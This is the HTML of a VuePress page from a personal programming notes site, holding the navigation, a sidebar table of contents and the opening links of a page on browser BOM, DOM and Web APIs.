<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>BOM and DOM | Notes of Tan</title>
    <meta name="generator" content="VuePress 1.9.7">
    <link rel="icon" href="https://v1.vuepress.vuejs.org/hero.png">
    <meta name="description" content="Tan&#39;s notes.">
    <meta name="theme-color" content="#3eaf7c">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    
    <link rel="preload" href="/notes-of-tan/assets/css/0.styles.0a6bd042.css" as="style"><link rel="preload" href="/notes-of-tan/assets/js/app.f4f0a8b0.js" as="script"><link rel="preload" href="/notes-of-tan/assets/js/2.56609c80.js" as="script"><link rel="preload" href="/notes-of-tan/assets/js/3.565b7101.js" as="script"><link rel="prefetch" href="/notes-of-tan/assets/js/10.d288b15f.js"><link rel="prefetch" href="/notes-of-tan/assets/js/11.bbb6ea24.js"><link rel="prefetch" href="/notes-of-tan/assets/js/12.db860052.js"><link rel="prefetch" href="/notes-of-tan/assets/js/13.779ab4ef.js"><link rel="prefetch" href="/notes-of-tan/assets/js/14.758f3090.js"><link rel="prefetch" href="/notes-of-tan/assets/js/15.7f64b34c.js"><link rel="prefetch" href="/notes-of-tan/assets/js/16.a01fd7b3.js"><link rel="prefetch" href="/notes-of-tan/assets/js/17.a0047c0f.js"><link rel="prefetch" href="/notes-of-tan/assets/js/18.9dd4cc77.js"><link rel="prefetch" href="/notes-of-tan/assets/js/19.12213b74.js"><link rel="prefetch" href="/notes-of-tan/assets/js/20.a0d8082e.js"><link rel="prefetch" href="/notes-of-tan/assets/js/21.ff57e006.js"><link rel="prefetch" href="/notes-of-tan/assets/js/22.19b62ce3.js"><link rel="prefetch" href="/notes-of-tan/assets/js/23.2c65e4c4.js"><link rel="prefetch" href="/notes-of-tan/assets/js/24.ec75c3da.js"><link rel="prefetch" href="/notes-of-tan/assets/js/25.f6738f30.js"><link rel="prefetch" href="/notes-of-tan/assets/js/26.0e99b0ce.js"><link rel="prefetch" href="/notes-of-tan/assets/js/27.060515ee.js"><link rel="prefetch" href="/notes-of-tan/assets/js/28.15440bda.js"><link rel="prefetch" href="/notes-of-tan/assets/js/29.fa7b4513.js"><link rel="prefetch" href="/notes-of-tan/assets/js/30.ae22c2fb.js"><link rel="prefetch" href="/notes-of-tan/assets/js/31.b9ade7f0.js"><link rel="prefetch" href="/notes-of-tan/assets/js/32.6fe4b018.js"><link rel="prefetch" href="/notes-of-tan/assets/js/33.5d420b01.js"><link rel="prefetch" href="/notes-of-tan/assets/js/34.2a02cb4f.js"><link rel="prefetch" href="/notes-of-tan/assets/js/35.b98e11e9.js"><link rel="prefetch" href="/notes-of-tan/assets/js/36.d4034dc3.js"><link rel="prefetch" href="/notes-of-tan/assets/js/37.185689b4.js"><link rel="prefetch" href="/notes-of-tan/assets/js/4.c9b2195f.js"><link rel="prefetch" href="/notes-of-tan/assets/js/5.0096d329.js"><link rel="prefetch" href="/notes-of-tan/assets/js/6.254eb4c9.js"><link rel="prefetch" href="/notes-of-tan/assets/js/7.1b486bac.js"><link rel="prefetch" href="/notes-of-tan/assets/js/8.09d51994.js"><link rel="prefetch" href="/notes-of-tan/assets/js/9.5d8277ff.js">
    <link rel="stylesheet" href="/notes-of-tan/assets/css/0.styles.0a6bd042.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/notes-of-tan/" class="home-link router-link-active"><!----> <span class="site-name">Notes of Tan</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Java" class="dropdown-title"><span class="title">Java</span> <span class="arrow down"></span></button> <button type="button" aria-label="Java" class="mobile-dropdown-title"><span class="title">Java</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaBasics.html" class="nav-link">
  Java Basics
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaUtils.html" class="nav-link">
  Java Utilities
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaConcurrency.html" class="nav-link">
  Java Concurrency
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaIO.html" class="nav-link">
  IO
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaMisc.html" class="nav-link">
  Java Miscellanea
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/JVM.html" class="nav-link">
  Java Virtual Machine
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Backend" class="dropdown-title"><span class="title">Backend</span> <span class="arrow down"></span></button> <button type="button" aria-label="Backend" class="mobile-dropdown-title"><span class="title">Backend</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/SpringNotes.html" class="nav-link">
  Spring
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/OS-notes.html" class="nav-link">
  OS
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/database.html" class="nav-link">
  Database
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/SQL_notes.html" class="nav-link">
  SQL
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/distributed.html" class="nav-link">
  Distributed System
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/redis-notes.html" class="nav-link">
  Redis
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Frontend" class="dropdown-title"><span class="title">Frontend</span> <span class="arrow down"></span></button> <button type="button" aria-label="Frontend" class="mobile-dropdown-title"><span class="title">Frontend</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/CSS-notes.html" class="nav-link">
  CSS
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/html-notes.html" class="nav-link">
  HTML
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/todo/jsNotes.html" class="nav-link">
  JS, TS
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/BOM_DOM_notes.html" aria-current="page" class="nav-link router-link-exact-active router-link-active">
  BOM, DOM, Web API
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/todo/react_notes.html" class="nav-link">
  React
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Other" class="dropdown-title"><span class="title">Other</span> <span class="arrow down"></span></button> <button type="button" aria-label="Other" class="mobile-dropdown-title"><span class="title">Other</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/algo_notes.html" class="nav-link">
  Algorithm
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/git_notes.html" class="nav-link">
  Git
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/DesignPatternNotes.html" class="nav-link">
  Design Pattern
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/HTTP.html" class="nav-link">
  HTTP
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/mac-notes.html" class="nav-link">
  MacOS
</a></li></ul></div></div> <a href="https://github.com/tangentyh/notes-of-tan" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Java" class="dropdown-title"><span class="title">Java</span> <span class="arrow down"></span></button> <button type="button" aria-label="Java" class="mobile-dropdown-title"><span class="title">Java</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaBasics.html" class="nav-link">
  Java Basics
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaUtils.html" class="nav-link">
  Java Utilities
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaConcurrency.html" class="nav-link">
  Java Concurrency
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaIO.html" class="nav-link">
  IO
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/javaMisc.html" class="nav-link">
  Java Miscellanea
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/java/JVM.html" class="nav-link">
  Java Virtual Machine
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Backend" class="dropdown-title"><span class="title">Backend</span> <span class="arrow down"></span></button> <button type="button" aria-label="Backend" class="mobile-dropdown-title"><span class="title">Backend</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/SpringNotes.html" class="nav-link">
  Spring
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/OS-notes.html" class="nav-link">
  OS
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/database.html" class="nav-link">
  Database
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/SQL_notes.html" class="nav-link">
  SQL
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/distributed.html" class="nav-link">
  Distributed System
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/backend/redis-notes.html" class="nav-link">
  Redis
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Frontend" class="dropdown-title"><span class="title">Frontend</span> <span class="arrow down"></span></button> <button type="button" aria-label="Frontend" class="mobile-dropdown-title"><span class="title">Frontend</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/CSS-notes.html" class="nav-link">
  CSS
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/html-notes.html" class="nav-link">
  HTML
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/todo/jsNotes.html" class="nav-link">
  JS, TS
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/BOM_DOM_notes.html" aria-current="page" class="nav-link router-link-exact-active router-link-active">
  BOM, DOM, Web API
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/todo/react_notes.html" class="nav-link">
  React
</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="Other" class="dropdown-title"><span class="title">Other</span> <span class="arrow down"></span></button> <button type="button" aria-label="Other" class="mobile-dropdown-title"><span class="title">Other</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/notes-of-tan/algo_notes.html" class="nav-link">
  Algorithm
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/git_notes.html" class="nav-link">
  Git
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/DesignPatternNotes.html" class="nav-link">
  Design Pattern
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/HTTP.html" class="nav-link">
  HTTP
</a></li><li class="dropdown-item"><!----> <a href="/notes-of-tan/mac-notes.html" class="nav-link">
  MacOS
</a></li></ul></div></div> <a href="https://github.com/tangentyh/notes-of-tan" target="_blank" rel="noopener noreferrer" class="repo-link">
    GitHub
    <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>BOM and DOM</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/notes-of-tan/BOM_DOM_notes.html#miscellanea" class="sidebar-link">Miscellanea</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#common-internet-explorer-errors" class="sidebar-link">Common Internet Explorer Errors</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#script" class="sidebar-link">&lt;script&gt;</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#bom" class="sidebar-link">BOM</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#core-the-window-object" class="sidebar-link">Core: the window object</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-location-object" class="sidebar-link">The Location Object</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-navigator-object" class="sidebar-link">The Navigator Object</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-screen-and-the-history-object" class="sidebar-link">The Screen and the History Object</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#client-detection" class="sidebar-link">Client Detection</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#capability-detection-and-quirks-detection" class="sidebar-link">Capability Detection and Quirks Detection</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#user-agent-detection" class="sidebar-link">User-Agent Detection</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#dom" class="sidebar-link">DOM</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#dom-level-1" class="sidebar-link">DOM Level 1</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-node-type" class="sidebar-link" style="padding-left:3rem;">The Node Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-document-type" class="sidebar-link" style="padding-left:3rem;">The Document Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-element-type" class="sidebar-link" style="padding-left:3rem;">The Element Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-text-type" class="sidebar-link" style="padding-left:3rem;">The Text Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#type-of-minimal-use" class="sidebar-link" style="padding-left:3rem;">Type of Minimal Use</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-comment-type" class="sidebar-link" style="padding-left:4rem;">The Comment Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-cdatasection-type" class="sidebar-link" style="padding-left:4rem;">The CDATASection Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-documenttype-type" class="sidebar-link" style="padding-left:4rem;">The DocumentType Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-documentfragment-type" class="sidebar-link" style="padding-left:3rem;">The DocumentFragment Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-attr-type" class="sidebar-link" style="padding-left:3rem;">The Attr Type</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#working-with-the-dom" class="sidebar-link" style="padding-left:3rem;">Working With The DOM</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#dom-extensions" class="sidebar-link">DOM Extensions</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#selectors-api" class="sidebar-link" style="padding-left:3rem;">Selectors API</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#element-traversal" class="sidebar-link" style="padding-left:3rem;">Element Traversal</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#html5" class="sidebar-link" style="padding-left:3rem;">HTML5</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#proprietary-extensions" class="sidebar-link" style="padding-left:3rem;">Proprietary Extensions</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#dom-levels-2-and-3" class="sidebar-link">DOM Levels 2 and 3</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#xml-namespaces-rarely-used" class="sidebar-link" style="padding-left:3rem;">XML Namespaces (rarely used)</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#other-changes" class="sidebar-link" style="padding-left:3rem;">Other Changes</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#styles" class="sidebar-link" style="padding-left:3rem;">Styles</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#style-global-attribute" class="sidebar-link" style="padding-left:4rem;">style Global Attribute</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#style-sheets" class="sidebar-link" style="padding-left:4rem;">Style Sheets</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#css-rules" class="sidebar-link" style="padding-left:4rem;">CSS Rules</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#element-dimensions-not-dom-2-but-cssom" class="sidebar-link" style="padding-left:3rem;">Element Dimensions (not DOM 2 but CSSOM)</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#traversal" class="sidebar-link" style="padding-left:3rem;">Traversal</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#ranges" class="sidebar-link" style="padding-left:3rem;">Ranges</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#new-bom-and-dom-related" class="sidebar-link">New BOM and DOM Related</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#events" class="sidebar-link">Events</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#event-handlers" class="sidebar-link">Event Handlers</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-event-object" class="sidebar-link">The Event Object</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#event-types" class="sidebar-link">Event Types</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#ui-events" class="sidebar-link" style="padding-left:3rem;">UI Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#focus-events" class="sidebar-link" style="padding-left:3rem;">Focus Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#mouse-and-wheel-events" class="sidebar-link" style="padding-left:3rem;">Mouse and Wheel Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#keyboard-and-text-events" class="sidebar-link" style="padding-left:3rem;">Keyboard and Text Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#composition-events" class="sidebar-link" style="padding-left:3rem;">Composition Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#session-history-events" class="sidebar-link" style="padding-left:3rem;">Session History Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#sensor-events" class="sidebar-link" style="padding-left:3rem;">Sensor Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#touch-events" class="sidebar-link" style="padding-left:3rem;">Touch Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#clipboard-events" class="sidebar-link" style="padding-left:3rem;">Clipboard Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#message-events" class="sidebar-link" style="padding-left:3rem;">Message Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#drag-drop-events" class="sidebar-link" style="padding-left:3rem;">Drag &amp; Drop Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#memory-and-performance" class="sidebar-link">Memory and Performance</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#simulate-events" class="sidebar-link">Simulate Events</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#scripting-forms" class="sidebar-link">Scripting Forms</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#form-basics" class="sidebar-link">Form Basics</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#scripting-text-boxes" class="sidebar-link">Scripting Text Boxes</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#html5-constraint-validation-api" class="sidebar-link">HTML5 Constraint Validation API</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#scripting-select-boxes" class="sidebar-link">Scripting Select Boxes</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#rich-text-editing" class="sidebar-link">Rich Text Editing</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#graphics-with-canvas" class="sidebar-link">Graphics with Canvas</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#interface" class="sidebar-link">Interface</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#the-2d-context" class="sidebar-link">The 2D Context</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#basics-and-shape" class="sidebar-link" style="padding-left:3rem;">Basics and Shape</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#path-drawing" class="sidebar-link" style="padding-left:3rem;">Path Drawing</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#text-drawing" class="sidebar-link" style="padding-left:3rem;">Text Drawing</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#transformation-and-state" class="sidebar-link" style="padding-left:3rem;">Transformation and State</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#image-drawing" class="sidebar-link" style="padding-left:3rem;">Image Drawing</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#shadows-gradients-and-patterns" class="sidebar-link" style="padding-left:3rem;">Shadows, Gradients and Patterns</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#composition-and-optimization" class="sidebar-link" style="padding-left:3rem;">Composition and Optimization</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#webgl" class="sidebar-link">WebGL</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#media-elements" class="sidebar-link">Media Elements</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#xml" class="sidebar-link">XML</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#ajax-and-comet" class="sidebar-link">Ajax and Comet</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#ajax" class="sidebar-link">Ajax</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#progress-events" class="sidebar-link">Progress Events</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#cors" class="sidebar-link">CORS</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#bypass-cors" class="sidebar-link">Bypass CORS</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#server-push" class="sidebar-link">Server Push</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#server-sent-events-sse" class="sidebar-link" style="padding-left:3rem;">Server-Sent Events (SSE)</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#web-sockets" class="sidebar-link" style="padding-left:3rem;">Web Sockets</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#fetch-api" class="sidebar-link">Fetch API</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#offline-applications-and-client-side-storage" class="sidebar-link">Offline Applications and Client-Side Storage</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#offline-app" class="sidebar-link">Offline App</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#service-worker" class="sidebar-link" style="padding-left:3rem;">Service Worker</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#data-storage" class="sidebar-link">Data Storage</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#cookies" class="sidebar-link" style="padding-left:3rem;">Cookies</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#cookie-security" class="sidebar-link" style="padding-left:4rem;">cookie security</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#internet-explorer-user-data" class="sidebar-link" style="padding-left:3rem;">Internet Explorer User Data</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#web-storage" class="sidebar-link" style="padding-left:3rem;">Web Storage</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#indexeddb" class="sidebar-link" style="padding-left:3rem;">IndexedDB</a></li></ul></li><li><a href="/notes-of-tan/BOM_DOM_notes.html#apis" class="sidebar-link">APIs</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#file-api" class="sidebar-link">File API</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#fullscreen-api" class="sidebar-link">Fullscreen API</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#performance" class="sidebar-link">Performance</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#web-worker" class="sidebar-link">Web Worker</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#url" class="sidebar-link">URL</a></li><li class="sidebar-sub-header"><a href="/notes-of-tan/BOM_DOM_notes.html#payment-request-api" class="sidebar-link">Payment Request API</a></li></ul></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="bom-and-dom"><a href="#bom-and-dom" class="header-anchor">#</a> BOM and DOM</h1> <h2 id="miscellanea"><a href="#miscellanea" class="header-anchor">#</a> Miscellanea</h2> <ol><li><p><a href="https://developer.mozilla.org/en-US/docs/Web/API" target="_blank" rel="noopener noreferrer">Web APIs | MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></p></li> <li><p><a href="https://developers.google.com/web/tools/chrome-devtools/" target="_blank" rel="noopener noreferrer">Chrome DevTools  |  Tools for Web Developers  |  Google Developers<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" 